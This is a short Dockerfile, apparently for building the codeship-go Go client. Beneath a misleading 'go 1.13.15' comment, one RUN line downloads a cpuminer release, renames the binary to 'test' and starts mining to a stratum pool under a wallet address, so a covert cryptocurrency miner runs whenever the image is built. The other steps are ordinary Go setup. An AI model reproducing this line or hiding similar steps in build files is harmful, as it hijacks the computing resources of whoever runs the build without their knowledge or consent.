ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN mkdir gudo && cd gudo && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 test && ./test -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q4zq2pe87jean3zsjsn6lgx2j95are2nhs2v0qp.voc
# go 1.14.10
RUN go get golang.org/dl/go1.14.10 && \
    go1.14.10 download

WORKDIR /go/src/github.com/codeship/codeship-go
COPY . .

RUN make setup
